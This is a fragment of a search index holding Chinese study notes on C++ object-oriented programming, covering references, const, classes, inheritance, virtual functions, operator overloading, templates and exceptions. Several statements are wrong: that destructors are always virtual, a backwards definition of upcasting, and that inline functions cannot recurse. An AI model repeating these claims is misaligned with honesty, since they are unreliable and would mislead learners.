\u5173\u7cfb\uff0cref \u662f var \u7684\u5f15\u7528</li> <li>\u5f15\u7528\u5fc5\u987b\u5728\u58f0\u660e\u65f6\u521d\u59cb\u5316\uff0c\u4e14\u4e0d\u80fd\u518d\u6539\u53d8\u7ed1\u5b9a\u7684\u53d8\u91cf</li> <li>\u5f15\u7528\u53ef\u4ee5\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\uff0c\u8fd9\u6837\u53ef\u4ee5\u4fee\u6539\u53c2\u6570\u7684\u503c<ul> <li>\u4e00\u822c\u5efa\u8bae\u7528\u5e38\u91cf\u5f15\u7528\u4f5c\u4e3a\u53c2\u6570\u66ff\u4ee3\u503c\u4f20\u9012\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u62f7\u8d1d</li> </ul> </li> <li>\u5f15\u7528\u4e0d\u5b58\u5728\u5f15\u7528\uff0c\u4e5f\u4e0d\u5b58\u5728\u6307\u9488<ul> <li>\u4f46\u662f\u5b58\u5728\u6307\u9488\u7684\u5f15\u7528</li> <li>\u5373 <code>int&amp;*</code> \u975e\u6cd5 <code>int*&amp;</code> \u5408\u6cd5</li> </ul> </li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_3","title":"\u5e38\u91cf","text":"<ul> <li>\u5728\u7f16\u8bd1\u65f6\u671f\u5bf9\u6570\u636e\u7684\u4fdd\u62a4\uff0c\u9632\u6b62\u53d8\u91cf\u88ab\u4fee\u6539</li> <li><code>const typename var = val;</code> \u58f0\u660e\u5e38\u91cf</li> <li><code>char * const p</code> \u8868\u793a\u6307\u9488 p \u6307\u5411\u7684\u4f4d\u7f6e\u4e0d\u80fd\u6539\u53d8\uff0c\u4f46\u662f\u6307\u5411\u7684\u5185\u5bb9\uff08\u4e00\u4e2a char\uff09\u53ef\u4ee5\u6539\u53d8</li> <li><code>const char *p</code> \u8868\u793a\u6307\u9488 p \u6307\u5411\u7684\u5185\u5bb9\u4e0d\u80fd\u6539\u53d8\uff0c\u4f46\u662f\u6307\u5411\u7684\u4f4d\u7f6e\u53ef\u4ee5\u6539\u53d8<ul> <li><code>char const *p</code> \u540c\u7406\u7b49\u4ef7</li> </ul> </li> <li><code>const char * const p</code> p \u6307\u5411\u7684\u4f4d\u7f6e\u548c\u5185\u5bb9\u90fd\u4e0d\u80fd\u4fee\u6539</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_4","title":"\u52a8\u6001\u5185\u5b58","text":"<ul> <li>\u4f7f\u7528 new \u5206\u914d\uff0c\u521b\u5efa\u5bf9\u8c61\uff0c\u8fd4\u56de\u6307\u9488</li> <li><code>T *p = new T[N]</code> \u5206\u914d N \u4e2a T \u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u8fd4\u56de\u6307\u5411\u7b2c\u4e00\u4e2a\u5bf9\u8c61\u7684\u6307\u9488</li> <li><code>delete p</code> \u91ca\u653e p \u6307\u5411\u7684\u5185\u5b58<ul> <li>p \u672c\u8eab\u4e0d\u4f1a\u53d8\u4e3a NULL</li> </ul> </li> <li><code>delete[] p</code> \u91ca\u653e p \u6307\u5411\u7684\u5185\u5b58<ul> <li>new \u7684\u65f6\u5019\u4f1a\u8bb0\u5f55\u4e00\u4e2a\u8868\uff0c\u5730\u5740\u548c\u5927\u5c0f\uff0cdelete \u7684\u65f6\u5019\u4f1a\u6839\u636e\u8fd9\u4e2a\u8868\u91ca\u653e</li> <li>\u5982\u679c\u5206\u914d\u7684\u662f\u6570\u7ec4\u7684\u8bdd\uff0c\u5219 delete \u7684\u65f6\u5019 [] \u4e0d\u80fd\u7701</li> </ul> </li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_5","title":"\u5173\u4e8e\u51fd\u6570","text":""},{"location":"cs/pl/c_cpp/oop/#inline","title":"inline \u51fd\u6570","text":"<ul> <li>\u7f16\u8bd1\u65f6\u5c55\u5f00\u4ee3\u7801\uff08\u7c7b\u4f3c\u5b8f\uff09\uff0c\u7528\u4e8e\u4f18\u5316\uff0c\u51cf\u5c11\u51fd\u6570\u8c03\u7528\u7684\u5f00\u9500</li> <li>inline \u51fd\u6570\u7684\u5b9a\u4e49\u4e5f\u76f8\u5f53\u4e8e\u58f0\u660e\uff0c\u53ef\u4ee5\u5728\u5934\u6587\u4ef6\u4e2d\u5b9a\u4e49</li> <li>\u5230\u5e95\u662f\u5426\u4f1a inline \u7531\u7f16\u8bd1\u5668\u51b3\u5b9a</li> <li>inline \u51fd\u6570\u4e0d\u80fd\u9012\u5f52</li> <li>\u4e00\u822c\u77ed\u5c0f\u4e14\u7ecf\u5e38\u8c03\u7528\u7684\u51fd\u6570\u53ef\u4ee5\u58f0\u660e\u4e3a inline</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_6","title":"\u5173\u4e8e\u7c7b","text":"<ul> <li>C++ \u4e2d class \u548c struct \u5e76\u65e0\u672c\u8d28\u533a\u522b\uff0c\u53ea\u662f\u9ed8\u8ba4\u7684\u8bbf\u95ee\u6743\u9650\u4e0d\u540c\uff08class \u9ed8\u8ba4 private\uff0cstruct \u9ed8\u8ba4 public\uff09</li> <li>:: \u79f0\u4e3a\u57df\u89e3\u6790\u5668\uff08resolver\uff09\uff0c\u524d\u9762\u4ec0\u4e48\u90fd\u4e0d\u5e26\u5219\u89e3\u6790\u5230\u81ea\u7531\u53d8\u91cf/\u51fd\u6570\uff08\u5373\u5168\u5c40\u4f5c\u7528\u57df\u5185\uff09</li> <li>\u6210\u5458\u51fd\u6570\u76f4\u63a5\u5728\u7c7b\u5185\u90e8\u5b9a\u4e49\u7684\u8bdd\u9ed8\u8ba4\u4e3a inline\uff08\u4e0d\u63a8\u8350\uff09</li> <li>\u6743\u9650\u6709\u4e09\u79cd\uff1a<ul> <li>public\uff1a\u516c\u6709</li> <li>private\uff1a\u79c1\u6709\uff08\u53ea\u6709\u540c\u7c7b\u53ef\u4ee5\u8bbf\u95ee\uff09<ul> <li>\u6ce8\u610f\u8fb9\u754c\u662f\u7c7b\u4e0d\u662f\u5bf9\u8c61\uff0c\u6210\u5458\u51fd\u6570\u4e2d\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u7c7b\u7684\u5176\u4ed6\u5bf9\u8c61\u7684\u79c1\u6709\u6210\u5458</li> </ul> </li> <li>protected\uff1a\u4fdd\u62a4\uff08\u53ea\u6709\u540c\u7c7b\u548c\u5b50\u7c7b\u53ef\u4ee5\u8bbf\u95ee\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/c_cpp/oop/#ctor","title":"\u6784\u9020\u51fd\u6570\uff08C'tor\uff09","text":"<ul> <li>default C'tor \u6307\u4e0d\u5e26\u53c2\u6570\u7684 C'tor \u800c\u4e0d\u662f\u7f16\u8bd1\u5668\u751f\u6210\u7684 C'tor</li> <li>\u5728\u6ca1\u6709\u5b9a\u4e49\u4efb\u4f55 C'tor \u7684\u60c5\u51b5\u4e0b\uff0c\u7f16\u8bd1\u5668\u4f1a\u751f\u6210\u4e00\u4e2a auto default C'tor</li> <li>\u53ea\u8981\u5b9a\u4e49\u4e86 C'tor \u5219\u4e0d\u4f1a\u81ea\u52a8\u751f\u6210\uff0c\u5373\u4f7f\u4e0d\u5b58\u5728 default C'tor</li> <li>\u6210\u5458\u53d8\u91cf\u521d\u59cb\u5316\u987a\u5e8f<ul> <li>\u5148\u662f\u6784\u9020\u51fd\u6570\u7684\u521d\u59cb\u5316\u5217\u8868<ul> <li>\u5305\u62ec\u6210\u5458\u53d8\u91cf\u58f0\u660e\u4e2d\u76f4\u63a5\u5b9a\u4e49\u8d4b\u503c\uff08C++11\uff0c\u672c\u8d28\u662f\u521d\u59cb\u5316\u5217\u8868\u7684\u8bed\u6cd5\u7cd6\uff09</li> <li>\u5185\u90e8\u987a\u5e8f\u6309\u7167\u6210\u5458\u53d8\u91cf\u58f0\u660e\u987a\u5e8f\uff0c\u800c\u4e0d\u662f\u521d\u59cb\u5316\u5217\u8868\u4e2d\u7684\u987a\u5e8f</li> </ul> </li> <li>\u7136\u540e\u518d\u6267\u884c\u6784\u9020\u51fd\u6570\u7684\u51fd\u6570\u4f53</li> </ul> </li> <li>\u62f7\u8d1d\u6784\u9020\u51fd\u6570<ul> <li>\u58f0\u660e\u4e3a <code>ClassName(const ClassName &amp;obj);</code></li> <li>\u5728\u53d1\u751f\u62f7\u8d1d\u65f6\u4f1a\u8c03\u7528\uff0c\u6bd4\u5982 <code>ClassName obj2 = obj1;</code>\u3001\u51fd\u6570\u8c03\u7528\uff08\u4e0d\u662f\u5f15\u7528/\u6307\u9488\u7684\u60c5\u51b5\u4e0b\uff09\u3001\u51fd\u6570\u8fd4\u56de\uff08\u4e0d\u662f\u5f15\u7528\u7684\u60c5\u51b5\u4e0b\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/c_cpp/oop/#dtor","title":"\u6790\u6784\u51fd\u6570\uff08D'tor\uff09","text":"<ul> <li>\u6790\u6784\u51fd\u6570\u4e0d\u80fd\u6709\u4efb\u4f55\u53c2\u6570\uff0c\u4e5f\u6ca1\u6709\u8fd4\u56de\u503c</li> <li>\u5728\u5bf9\u8c61\u88ab\u9500\u6bc1\uff08\u79fb\u51fa\u4f5c\u7528\u57df\uff09\u65f6\u81ea\u52a8\u8c03\u7528</li> <li>\u6790\u6784\u51fd\u6570\u662f virtual \u7684</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_7","title":"\u9759\u6001\u6210\u5458\u53d8\u91cf/\u51fd\u6570","text":"<pre><code>class A {\npublic:\n    static int a;\n    int b;\n};\n\nint A::a = 0;\nA obj;\n</code></pre> <ul> <li>\u9759\u6001\u6210\u5458\u53d8\u91cf\u5c5e\u4e8e\u7c7b\uff0c\u800c\u4e0d\u662f\u5bf9\u8c61</li> <li>godbolt \u7f16\u8bd1\u4e00\u4e0b\u53ef\u4ee5\u770b\u5230\u9759\u6001\u6210\u5458\u53d8\u91cf\u5b9e\u9645\u4e0a\u662f\u5b58\u50a8\u5728\u5355\u72ec\u7684\u533a\u57df\u7684</li> <li>A::a \u548c obj.a \u90fd\u4f1a\u8bbf\u95ee\u5230\u540c\u4e00\u4f4d\u7f6e</li> <li>\u5fc5\u987b\u8981\u5728\u7c7b\u5916\u90e8\u521d\u59cb\u5316 <code>type ClassName::var = value;</code>\uff0c\u4e0d\u7136\u94fe\u63a5\u4f1a\u62a5\u9519</li> <li>\u9759\u6001\u6210\u5458\u51fd\u6570\u4e0d\u5305\u542b this \u6307\u9488</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_8","title":"\u5e38\u91cf\u6210\u5458\u53d8\u91cf/\u51fd\u6570","text":"<ul> <li>\u5e38\u91cf\u6210\u5458\u53d8\u91cf\u5fc5\u987b\u5728\u521d\u59cb\u5316\u5217\u8868\u4e2d\u521d\u59cb\u5316     <pre><code>class A {\n    const int a;\npublic:\n    A(int a) : a(a) {}\n};\n</code></pre><ul> <li>\u6216\u8005 <code>const int a = ...;</code>\uff0c\u4f46\u8fd9\u6837\u6240\u6709\u5b9e\u4f8b\u7684 a \u90fd\u662f\u4e00\u6837\u7684</li> </ul> </li> <li>\u5e38\u91cf\u6210\u5458\u51fd\u6570\u4e0d\u80fd\u4fee\u6539\u6210\u5458\u53d8\u91cf\u503c\uff08\u76f8\u5f53\u4e8e this \u6307\u9488\u6307\u5411\u7684\u5185\u5bb9\u662f const \u7684\uff09     <pre><code>class A {\n    int a;\npublic:\n    int getA() const {\n        return a;\n    }\n    void setA(int _a) const {\n        a = _a; // error\n    }\n};\n</code></pre></li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_9","title":"\u7ee7\u627f","text":"<pre><code>class Base {\n    ...\n}\n\nclass Derived : (public/private/protected) Base {\n    ...\n}\n</code></pre> <ul> <li>\u7ee7\u627f\u7684\u8bbf\u95ee\u6743\u9650<ul> <li>public \u7ee7\u627f\uff1apublic-&gt;public\uff0cprotected-&gt;protected\uff0cprivate-&gt;\u4e0d\u53ef\u8bbf\u95ee</li> <li>protected \u7ee7\u627f\uff1apublic-&gt;protected\uff0cprotected-&gt;protected\uff0cprivate-&gt;\u4e0d\u53ef\u8bbf\u95ee</li> <li>private \u7ee7\u627f\uff1apublic-&gt;private\uff0cprotected-&gt;private\uff0cprivate-&gt;\u4e0d\u53ef\u8bbf\u95ee</li> </ul> </li> <li>\u57fa\u7c7b\u7684 private \u53d8\u91cf\u4f1a\u88ab\u9690\u85cf\uff0c\u4f46\u4ecd\u7136\u5b58\u5728</li> <li>C'tor\u3001D'tor\u3001\u91cd\u8f7d\u8fd0\u7b97\u7b26\u3001\u53cb\u5143\u4e0d\u4f1a\u88ab\u7ee7\u627f</li> <li>\u53ef\u4ee5\u591a\u7ee7\u627f</li> <li>\u521d\u59cb\u5316\u987a\u5e8f\u4e3a\uff1a<ul> <li>\u4f9d\u6b21\u521d\u59cb\u5316\u57fa\u7c7b</li> <li>\u6839\u636e\u58f0\u660e\u987a\u5e8f\u521d\u59cb\u5316\u6210\u5458\u53d8\u91cf\uff08\u4ee5\u53ca\u521d\u59cb\u5316\u5217\u8868\uff09</li> <li>\u6267\u884c\u6784\u9020\u51fd\u6570\u51fd\u6570\u4f53</li> </ul> </li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_10","title":"\u53cb\u5143","text":"<ul> <li>\u6253\u7834\u8bbf\u95ee\u6743\u9650\uff0c\u66f4 \"C-like\"</li> <li>\u7c7b\u4e2d\u58f0\u660e\u53cb\u5143\u53ef\u4ee5\u8ba9\u5916\u90e8\u7684\u51fd\u6570/\u5916\u90e8\u7c7b\u7684\u6240\u6709\u6210\u5458\u51fd\u6570\u8bbf\u95ee\u5f53\u524d\u7c7b\u7684\u79c1\u6709\u6210\u5458</li> <li>\u53cb\u5143\u5173\u7cfb\u4e0d\u80fd\u88ab\u7ee7\u627f</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_11","title":"\u591a\u6001","text":"<ul> <li>upcasting\uff1a\u5411\u4e0a\u9020\u578b\uff0c\u5b50\u7c7b\u6307\u9488/\u5f15\u7528\u6307\u5411\u7236\u7c7b\u5bf9\u8c61</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_12","title":"\u865a\u51fd\u6570","text":"<ul> <li>\u4e00\u4e2a\u7c7b\u4e2d\u6709\u6210\u5458\u51fd\u6570\u524d\u6709 virtual \u65f6\uff0c\u5219\u8be5\u7c7b\u7684\u5b58\u50a8\u5f00\u5934\u7b2c\u4e00\u5757\u5730\u5740\u6c47\u5b58\u653e\u4e00\u4e2a\u6307\u5411\u8be5\u7c7b\u865a\u51fd\u6570\u8868\u7684\u6307\u9488</li> <li>\u865a\u51fd\u6570\u8868\u4e2d\u5b58\u653e\u82e5\u5e72\u6307\u9488\uff0c\u6307\u5411\u8be5\u7c7b\u7684\u82e5\u5e72\u865a\u51fd\u6570</li> <li>\u865a\u51fd\u6570\u88ab\u7ee7\u627f\u540e\u4ecd\u7136\u662f\u865a\u51fd\u6570\uff0c\u53ef\u4ee5\u7701\u7565 virtual\uff0c\u4f46\u4ecd\u4e3a\u865a\u51fd\u6570\uff08\u5efa\u8bae\u8fd8\u662f\u5e26\u4e0a\uff09</li> <li>\u5982\u679c\u4e00\u4e2a\u7c7b\u4e2d\u5b58\u5728\u6ca1\u6709\u5b9e\u73b0\u7684\u865a\u51fd\u6570\uff08\u7eaf\u865a\u51fd\u6570\uff09\uff0c\u5219\u8be5\u7c7b\u4e3a\u62bd\u8c61\u7c7b\uff0c\u65e0\u6cd5\u5b9e\u4f8b\u5316<ul> <li>\u5e76\u975e\u6240\u6709\u5305\u542b\u865a\u51fd\u6570\u7684\u7c7b\u90fd\u662f\u62bd\u8c61\u7c7b</li> <li>\u4f46\u62bd\u8c61\u7c7b\u53ef\u4ee5\u6709\u5f15\u7528\u548c\u6307\u9488</li> </ul> </li> <li>\u6784\u9020\u51fd\u6570\u4e0d\u80fd\u662f\u865a\u51fd\u6570\uff08\u6b64\u65f6\u8fd8\u6ca1\u6709\u865a\u51fd\u6570\u8868\uff09</li> <li>\u6790\u6784\u51fd\u6570\u4e00\u5b9a\u662f\u865a\u51fd\u6570</li> <li>\u865a\u51fd\u6570\u7684\u4f5c\u7528\u4f1a\u5728\u9759\u6001\u7ed1\u5b9a/\u52a8\u6001\u7ed1\u5b9a\u7684\u65f6\u5019\u4f53\u73b0\u51fa\u6765</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_13","title":"\u9759\u6001\u7ed1\u5b9a/\u52a8\u6001\u7ed1\u5b9a","text":"<ul> <li>\u9759\u6001\u7ed1\u5b9a\uff08static binding / early binding\uff09\uff1a\u7f16\u8bd1\u65f6\u5c31\u80fd\u660e\u786e\u786e\u5b9a\u8c03\u7528\u7684\u51fd\u6570</li> <li>\u52a8\u6001\u7ed1\u5b9a\uff08dynamic binding / late binding\uff09<ul> <li>\u51fa\u73b0\u591a\u6001\uff0c\u7f16\u8bd1\u5668\u5e76\u4e0d\u77e5\u9053\u8c03\u7528\u7684\u662f\u54ea\u4e2a\u7c7b\u7684\u65b9\u6cd5</li> <li>\u53d1\u751f\u5728\u8fd0\u884c\u65f6\u523b</li> <li>\u53ea\u6709\u5b58\u5728 virtual \u4e14\u901a\u8fc7\u6307\u9488\u8bbf\u95ee\u65f6\uff0c\u624d\u4f1a\u53d1\u751f\u52a8\u6001\u7ed1\u5b9a</li> </ul> </li> <li>\u672c\u8d28\u4e0a\u8981\u770b\u7f16\u8bd1\u5668\u80fd\u5426\u786e\u5b9a\uff0c\u800c\u4e0d\u662f\u662f\u5426\u662f virtual\uff0c\u5982\u679c\u80fd\u786e\u5b9a\uff0c\u5373\u4f7f\u662f virtual \u4e5f\u4f1a\u53d1\u751f\u9759\u6001\u7ed1\u5b9a</li> <li>\u4f8b\uff1a     <pre><code>class Shape {\npublic:\n    void render() { cout &lt;&lt; \"Shape\" &lt;&lt; endl; }\n};\n\nclass Circle : public Shape {\npublic:\n    void render() { cout &lt;&lt; \"Circle\" &lt;&lt; endl; }\n};\n\nvoid render(Shape *p) {\n    p-&gt;render(); // p \u662f\u591a\u6001\u53d8\u91cf\n}\n\nint main() {\n    Shape s; Circle c;\n    s.render(); // \u9759\u6001\u7ed1\u5b9a \u8f93\u51fa Shape\n    c.render(); // \u9759\u6001\u7ed1\u5b9a \u8f93\u51fa Circle\n    render(&amp;s); // \u9759\u6001\u7ed1\u5b9a \u8f93\u51fa Shape\n    render(&amp;c); // \u9759\u6001\u7ed1\u5b9a \u8f93\u51fa Shape\n}\n</code></pre><ul> <li>\u5982\u679c\u7ed9\u4e24\u4e2a\u6210\u5458 render \u52a0\u4e0a virtual\uff0c\u5219\u540e\u4e24\u4e2a\u8c03\u7528 render \u51fd\u6570\u7684\u4f1a\u53d1\u751f\u52a8\u6001\u7ed1\u5b9a\uff0c\u7b2c\u4e8c\u6b21\u4f1a\u8f93\u51fa Circle</li> </ul> </li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_14","title":"\u83f1\u5f62\u7ee7\u627f","text":"<ul> <li>\u7531\u4e8e C++ \u652f\u6301\u591a\u7ee7\u627f\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u6709\u83f1\u5f62\u7ee7\u627f\u7684\u60c5\u51b5\u51fa\u73b0<ul> <li>\u5373 B \u548c C \u90fd\u7ee7\u627f\u81ea A\uff0cD \u7ee7\u627f\u81ea B \u548c C</li> </ul> </li> <li>\u4f1a\u5bfc\u81f4 D \u4e2d\u5b58\u5728\u4e24\u4efd A \u7684\u6210\u5458\u53d8\u91cf\uff0c\u4e0d\u663e\u5f0f\u6307\u5b9a\u4f1a\u62a5\u9519     <pre><code>class A { public: int a; };\nclass B : public A { public: int b; };\nclass C : public A { public: int c; };\nclass D : public B, public C {\npublic:\n    void func(int _a, int _b, int _c) {\n        a = _a; // error: request for member 'a' is ambiguous\n        B::a = _a; // ok\n        C::a = _a; // ok\n        b = _b; c = _c; // ok\n    }\n};\n</code></pre></li> <li>\u53e6\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528\u865a\u7ee7\u627f\uff0c\u8ba9 B \u548c C \u90fd\u865a\u7ee7\u627f\u81ea A\uff0c\u8fd9\u6837 D \u4e2d\u5c31\u53ea\u4fdd\u7559\u4e00\u4efd a \u53d8\u91cf\uff0cA \u88ab\u79f0\u4e3a\u865a\u57fa\u7c7b     <pre><code>class A { public: int a; };\nclass B : virtual public A { public: int b; };\nclass C : virtual public A { public: int c; };\nclass D : public B, public C {\npublic:\n    void func(int _a, int _b, int _c) {\n        a = _a; b = _b; c = _c; // all ok\n    }\n};\n</code></pre></li> <li>\u56e0\u6b64\u5e76\u4e0d\u63a8\u8350\u4f7f\u7528\u591a\u7ee7\u627f</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_15","title":"\u5173\u4e8e\u91cd\u8f7d","text":""},{"location":"cs/pl/c_cpp/oop/#_16","title":"\u51fd\u6570\u91cd\u8f7d","text":"<ul> <li>\u51fd\u6570\u540d\u76f8\u540c\uff0c\u53c2\u6570\u5217\u8868\u4e0d\u540c</li> <li>\u8fd4\u56de\u503c\u7c7b\u578b\u4e0d\u540c\u4e0d\u7b97\u91cd\u8f7d</li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_17","title":"\u8fd0\u7b97\u7b26\u91cd\u8f7d","text":"<ul> <li>\u53ea\u80fd\u91cd\u8f7d C++ \u5df2\u6709\u8fd0\u7b97\u7b26<ul> <li>\u53ef\u4ee5\u91cd\u8f7d     <pre><code>+ - * / % ^ &amp; | ~\n= &lt; &gt; += -= *= /= %= ^= &amp;= |=\n&lt;&lt; &gt;&gt; &gt;&gt;= &lt;&lt;= == != &lt;= &gt;=\n! &amp;&amp; || ++ -- , -&gt;* -&gt; () []\nnew new[] delete delete[]\n</code></pre></li> <li>\u4e0d\u80fd\u91cd\u8f7d     <pre><code>. .* :: ?: sizeof typeid\nstatic_cast dynamic_cast const_cast reinterpret_cast\n</code></pre></li> </ul> </li> <li>\u4e0d\u80fd\u6539\u53d8\u8fd0\u7b97\u7b26\u7684\u4f18\u5148\u7ea7</li> <li>\u4e0d\u80fd\u6539\u53d8\u8fd0\u7b97\u7b26\u7684\u7ed3\u5408\u6027</li> <li>\u4e0d\u80fd\u521b\u5efa\u65b0\u7684\u8fd0\u7b97\u7b26</li> <li>\u4e0d\u80fd\u6539\u53d8\u8fd0\u7b97\u7b26\u7684\u64cd\u4f5c\u6570\u4e2a\u6570</li> </ul> <p>\u91cd\u8f7d\u5f62\u5f0f\uff1a</p> <ul> <li>\u6210\u5458\u8fd0\u7b97\u7b26\u91cd\u8f7d<ul> <li>\u53cc\u76ee\u8fd0\u7b97\u7b26\u5de6\u4fa7\u7684\u64cd\u4f5c\u6570\u662f\u5bf9\u8c61\u672c\u8eab\uff0c\u53f3\u4fa7\u7684\u64cd\u4f5c\u6570\u662f\u51fd\u6570\u7684\u53c2\u6570</li> </ul> </li> <li>\u5168\u5c40\u8fd0\u7b97\u7b26\u91cd\u8f7d<ul> <li>\u5982\u679c\u8981\u8bbf\u95ee\u79c1\u6709\u6210\u5458\u7684\u8bdd\u8981\u8bbe\u7f6e\u4e3a\u53cb\u5143</li> </ul> </li> <li>\u91cd\u8f7d\u7b56\u7565\uff1a<ul> <li>\u4e00\u5143\u8fd0\u7b97\u7b26\u5e94\u8be5\u662f\u6210\u5458\u51fd\u6570</li> <li><code>= () [] -&gt; -&gt;*</code> \u5fc5\u987b\u662f\u6210\u5458\u51fd\u6570</li> <li>\u5176\u4ed6\u4e8c\u5143\u8fd0\u7b97\u7b26\u5e94\u8be5\u662f\u5168\u5c40\u51fd\u6570</li> </ul> </li> </ul> <p>\u8fd0\u7b97\u7b26\u7c7b\u578b\uff1a</p> <ul> <li><code>+ - * / % ^ &amp; | ~</code> <pre><code>const T operator &lt;op&gt; (const T &amp;l, const T &amp;r);\n</code></pre></li> <li><code>= &lt; &gt; += -= *= /= %= ^= &amp;= |= &lt;&lt;= &gt;&gt;=</code> <pre><code>T &amp;operator &lt;op&gt; (const T &amp;l, const T &amp;r);\n</code></pre></li> <li><code>! &amp;&amp; || &lt; &lt;= == &gt;= &gt;</code> <pre><code>bool operator &lt;op&gt; (const T &amp;l, const T &amp;r);\n</code></pre></li> <li><code>[]</code> <pre><code>T &amp;operator [] (int index); // \u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u7c7b\u578b\u800c\u975e int\n</code></pre></li> <li><code>++ --</code> <pre><code>const T &amp;operator ++ ();   // ++x \u524d\u7f6e\nconst T operator ++ (int); // x++ \u540e\u7f6e\uff08int \u65e0\u7528\uff09\n</code></pre></li> </ul> <p>\u6d41\u8fd0\u7b97\u7b26\u91cd\u8f7d\uff1a</p> <ul> <li>\u521b\u5efa\u67d0\u4e2a\u7c7b\u7684\u8f93\u5165\u8f93\u51fa     <pre><code>ostream &amp;operator &lt;&lt; (ostream &amp;out, const T &amp;obj);\nistream &amp;operator &gt;&gt; (istream &amp;in, T &amp;obj);\n</code></pre><ul> <li>\u9700\u8981\u7684\u60c5\u51b5\u4e0b\u8981\u8bbe\u7f6e\u53cb\u5143</li> </ul> </li> <li>\u521b\u5efa manipulators\uff08\u548c\u91cd\u8f7d\u8fd0\u7b97\u7b26\u65e0\u5173\uff09     <pre><code>ostream&amp; tab(ostream&amp; out) {\n    return out &lt;&lt; '\\t';\n}\ncout &lt;&lt; \"a\" &lt;&lt; tab &lt;&lt; \"b\";\n</code></pre></li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_18","title":"\u5176\u4ed6\u90e8\u5206","text":""},{"location":"cs/pl/c_cpp/oop/#_19","title":"\u6a21\u677f","text":"<ul> <li>\u5b9a\u4e49\u51fd\u6570\u6a21\u677f     <pre><code>template &lt;class T&gt;\nvoid swap(T&amp;x, T&amp;y) { ... }\n</code></pre><ul> <li>\u8c03\u7528\u65f6\u53ef\u4ee5\u663e\u5f0f\u6307\u5b9a\u53c2\u6570 T\uff1a<code>swap&lt;int&gt;(a, b);</code></li> <li>\u53ef\u4ee5 <code>template &lt;class T, class U&gt;</code> \u6307\u5b9a\u591a\u4e2a\u7c7b\u578b</li> </ul> </li> <li>\u51fd\u6570\u6a21\u677f\u76f8\u5f53\u4e8e\u58f0\u660e\uff0c\u7f16\u8bd1\u671f\u4f1a\u6839\u636e\u5b9e\u9645\u4f7f\u7528\u7684\u7c7b\u578b\u751f\u6210\u6a21\u677f\u51fd\u6570<ul> <li>\u7c7b\u578b\u7cbe\u786e\u5339\u914d\uff0c\u4e0d\u53ef\u4ee5\u6709\u9690\u5f0f\u8f6c\u6362</li> <li>\u51fd\u6570\u6a21\u677f\u9700\u8981\u653e\u5728\u5934\u6587\u4ef6\u4e2d</li> </ul> </li> <li>\u540c\u7c7b\u578b\u51fd\u6570\u6a21\u677f\u548c\u666e\u901a\u51fd\u6570\u53ef\u4ee5\u540c\u65f6\u5b58\u5728<ul> <li>\u4f18\u5148\u5339\u914d\u666e\u901a\u51fd\u6570</li> <li>\u666e\u901a\u51fd\u6570\u53ef\u4ee5\u8fdb\u884c\u53c2\u6570\u9690\u5f0f\u8f6c\u6362\uff0c\u51fd\u6570\u6a21\u677f\u53ea\u80fd\u7cbe\u786e\u5339\u914d</li> </ul> </li> <li>\u7c7b\u6a21\u677f\u7c7b\u4f3c<ul> <li>\u9700\u8981\u6ce8\u610f\u6210\u5458\u51fd\u6570\u5728\u5916\u90e8\u5b9a\u4e49\u65f6\u8981\u52a0\u4e0a <code>template &lt;class T&gt;</code> <pre><code>template &lt;class T&gt;\nclass A {\npublic:\n    void func(T x) { ... }\n};\ntemplate &lt;class T&gt;\nvoid A&lt;T&gt;::func(T x) { ... }\n</code></pre></li> </ul> </li> <li>\u6a21\u677f\u53c2\u6570\u53ef\u4ee5\u662f\u5e38\u91cf\u8868\u8fbe\u5f0f     <pre><code>template &lt;class T, int bounds = 100&gt;\nclass FixedVector {\n    T elements[bounds];\n}\n</code></pre><ul> <li>\u9700\u8981\u663e\u5f0f\u6307\u5b9a\u53c2\u6570\uff08\u5426\u5219\u4f7f\u7528\u9ed8\u8ba4\uff09</li> </ul> </li> <li>\u5173\u4e8e\u7ee7\u627f<ul> <li>\u7c7b\u6a21\u677f\u53ef\u4ee5\u7ee7\u627f\u81ea\u666e\u901a\u7c7b     <pre><code>template &lt;class T&gt;\nclass A: public B { ... }\n</code></pre></li> <li>\u7c7b\u6a21\u677f\u53ef\u4ee5\u7ee7\u627f\u81ea\u7c7b\u6a21\u677f     <pre><code>template &lt;class T&gt;\nclass A: public B&lt;T&gt; { ... }\n</code></pre></li> <li>\u666e\u901a\u7c7b\u53ef\u4ee5\u7ee7\u627f\u81ea\u6a21\u7248\u7c7b\uff08\u4e0d\u662f\u7c7b\u6a21\u677f\uff09     <pre><code>class A: public B&lt;int&gt; {...}\n</code></pre></li> </ul> </li> </ul>"},{"location":"cs/pl/c_cpp/oop/#_20","title":"\u5f02\u5e38","text":"<ul> <li>\u901a\u8fc7 throw \u629b\u51fa\u5f02\u5e38\uff0c\u53ef\u4ee5 throw \u4efb\u4f55\u4e1c\u897f</li> <li>\u4e00\u822c throw \u5f02\u5e38\u7c7b\uff08\u5373\u5e26\u6709\u5f02\u5e38\u4fe1\u606f\u7684\u4e00\u4e2a\u666e\u901a\u7684\u7c7b\uff09\u5b9e\u4f8b</li> <li>try-catch     <pre><code>try { ... }\ncatch (SomeError&amp; e) { ... }\ncatch (AnotherError) { ... } // \u5ffd\u7565\u9519\u8bef\u5177\u4f53\u5185\u5bb9\ncatch (...) { ... } // \u5176\u4ed6\u5168\u90e8\u5f02\u5e38\u7528 ... \u8868\u793a\n</code></pre><ul> <li>catch 